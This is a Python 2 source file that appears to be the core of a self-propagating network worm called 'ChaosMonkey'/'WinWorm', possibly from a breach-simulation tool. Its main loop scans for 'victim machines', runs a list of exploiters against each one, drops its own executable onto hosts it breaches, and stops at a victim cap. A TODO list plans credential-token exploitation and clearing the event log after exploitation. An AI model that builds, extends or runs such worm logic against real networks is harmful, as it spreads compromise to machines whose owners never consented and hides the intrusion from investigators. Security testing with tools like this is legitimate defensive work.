
import sys
import time
import logging
from system_singleton import SystemSingleton
from control import ControlClient
from config import WormConfiguration
from network.network_scanner import NetworkScanner

__author__ = 'itamar'

LOG = logging.getLogger(__name__)

# TODO:
# 1. Remote dating of copied file
# 2. OS Detection prior to exploit
# 3. Exploit using token credentials
# 4. OS Support for exploitation modules (win / linux specific)
# 5. Linux portability
# 6. Clear eventlog after exploitation
# 7. Add colors to logger

class ChaosMonkey(object):
    def __init__(self, args):
        self._keep_running = False
        self._exploited_machines = set()
        self._fail_exploitation_machines = set()
        self._singleton = SystemSingleton()

    def initialize(self):
        LOG.info("WinWorm is initializing...")

        if not self._singleton.try_lock():
            raise Exception("Another instance of the monkey is already running")

        self._network = NetworkScanner()
        self._network.initialize()
        self._keep_running = True
        self._exploiters = [exploiter() for exploiter in WormConfiguration.exploiter_classes]
        self._dropper_path = sys.argv[0]

        new_config = ControlClient.get_control_config()

    def start(self):
        LOG.info("WinWorm is running...")

        for _ in xrange(WormConfiguration.max_iterations):
            new_config = ControlClient.get_control_config()

            if not self._keep_running:
                break

            machines = self._network.get_victim_machines(WormConfiguration.scanner_class,
                                                         max_find=WormConfiguration.victims_max_find)

            for machine in machines:
                # skip machines that we've already exploited
                if machine in self._exploited_machines:
                    LOG.debug("Skipping %r - already exploited",
                              machine)
                    continue
                elif machine in self._fail_exploitation_machines:
                    LOG.debug("Skipping %r - exploitation failed before",
                              machine)
                    continue

                successful_exploiter = None
                for exploiter in self._exploiters:
                    LOG.info("Trying to exploit %r with exploiter %s...",
                             machine, exploiter.__class__.__name__)

                    try:
                        if exploiter.exploit_host(machine, self._dropper_path):
                            successful_exploiter = exploiter
                            break
                        else:
                            LOG.info("Failed exploiting %r with exploiter %s",
                                     machine, exploiter.__class__.__name__)
                    except Exception, exc:
                        LOG.error("Exception while attacking %s using %s: %s",
                                  machine, exploiter.__class__.__name__, exc)
                        continue

                if successful_exploiter:
                    self._exploited_machines.add(machine)

                    LOG.info("Successfully propagated to %s using %s",
                             machine, successful_exploiter.__class__.__name__)

                    # check if max-exploitation limit is reached
                    if WormConfiguration.victims_max_exploit <= len(self._exploited_machines):
                        self._keep_running = False

                        LOG.info("Max exploited victims reached (%d)", WormConfiguration.victims_max_exploit)
                        break
                else:
                    self._fail_exploitation_machines.add(machine)

            time.sleep(WormConfiguration.timeout_between_iterations)

        if self._keep_running:
            LOG.info("Reached max iterations (%d)", WormConfiguration.max_iterations)

    def cleanup(self):
        self._keep_running = False

        self._singleton.unlock()
